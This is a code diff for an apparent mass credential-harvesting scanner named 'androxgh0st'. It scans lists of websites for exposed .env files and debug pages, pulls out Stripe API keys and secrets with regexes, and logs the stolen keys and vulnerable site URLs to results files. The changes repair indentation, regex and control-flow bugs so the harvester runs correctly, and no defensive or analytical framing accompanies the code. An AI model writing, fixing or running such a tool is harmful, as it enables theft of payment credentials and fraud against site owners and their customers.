@@ -3,7 +3,8 @@ import requests, os, sys, json, time, signal, atexit
 from re import findall as reg
 import re
 import logging
-requests.packages.urllib3.disable_warnings()
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from threading import *
 from threading import Thread, Lock
 from configparser import ConfigParser
@@ -87,8 +88,8 @@ ENV_PATHS = [
 ]
 
 # Precompiled regex for Stripe values: support optional quotes
-RE_STRIPE_KEY = re.compile(r"\nSTRIPE_KEY=\s*(['\"])??(.*?)\1?\n")
-RE_STRIPE_SECRET = re.compile(r"\nSTRIPE_SECRET=\s*(['\"])??(.*?)\1?\n")
+RE_STRIPE_KEY = re.compile(r"\nSTRIPE_KEY=\s*(['\"])?(.*?)\1?\n")
+RE_STRIPE_SECRET = re.compile(r"\nSTRIPE_SECRET=\s*(['\"])?(.*?)\1?\n")
 RE_DBG_STRIPE_KEY = re.compile(r"<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>")
 RE_DBG_STRIPE_SECRET = re.compile(r"<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>")
 
@@ -124,44 +125,43 @@ class androxgh0st:
 			return False
 		stripe_key = ''
 		stripe_secret = ''
-			if "STRIPE_KEY=" in text:
+		if "STRIPE_KEY=" in text:
 			method = '.env'
-				try:
+			try:
 				stripe_key = RE_STRIPE_KEY.findall(text)[0][1]
-				except:
-					stripe_key = ''
-				try:
+			except:
+				stripe_key = ''
+			try:
 				stripe_secret = RE_STRIPE_SECRET.findall(text)[0][1]
-				except:
-					stripe_secret = ''
+			except:
+				stripe_secret = ''
 		elif "<td>STRIPE_SECRET</td>" in text or "<td>STRIPE_KEY</td>" in text:
-				method = 'debug'
-				try:
+			method = 'debug'
+			try:
 				stripe_key = RE_DBG_STRIPE_KEY.findall(text)[0]
-				except:
-					stripe_key = ''
-				try:
+			except:
+				stripe_key = ''
+			try:
 				stripe_secret = RE_DBG_STRIPE_SECRET.findall(text)[0]
-				except:
-					stripe_secret = ''
+			except:
+				stripe_secret = ''
 		else:
 			return False
 		build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
-					remover = str(build).replace('\r', '')
+		remover = str(build).replace('\r', '')
 		with FILE_LOCK:
 			with open('Results/STRIPE.txt', 'a') as save:
-					save.write(remover+'\n\n')
+				save.write(remover+'\n\n')
 			with open('Results/logsites/stripesite.txt','a') as saveurl:
 				saveurl.write(str(url).replace('\r', '')+'\n')
 			if ARGS and ARGS.json_out:
 				with open(ARGS.json_out, 'a') as jf:
 					entry = {"url": url, "method": method, "stripe_key": stripe_key, "stripe_secret": stripe_secret}
 					jf.write(json.dumps(entry)+"\n")
-					return True
+		return True
 
 def printf(text):
-	''.join([str(item) for item in text])
-	print(text + '\n')
+	print(text)
 
 def cleanup_handler(signum=None, frame=None):
 	"""Graceful shutdown handler"""
@@ -229,7 +229,7 @@ def main(url):
 			remover2 = str(url).replace('\r', '')
 			with FILE_LOCK:
 				with open('Results/logsites/vulnerable.txt','a') as save3:
-			save3.write(remover2+'\n')
+					save3.write(remover2+'\n')
 			getstripe = androxgh0st().payment_api(resp, url)
 			if getstripe:
 				text += ' | \033[32;1mSTRIPE\033[0m'
@@ -311,6 +311,8 @@ if __name__ == '__main__':
 				exit()
 		# Initialize global ARGS and SESSION
 		ARGS = args
+		lists = args.list
+		numthread = args.threads
 		s = requests.Session()
 		try:
 			from requests.adapters import HTTPAdapter
@@ -322,7 +324,6 @@ if __name__ == '__main__':
 		except Exception:
 			pass
 		SESSION = s
-		numthread = args.threads
 	# Initialize progress tracking
 	TOTAL_URLS = len(readsplit)
 	logger.info(f"Starting scan: {TOTAL_URLS} URLs, {numthread} threads")
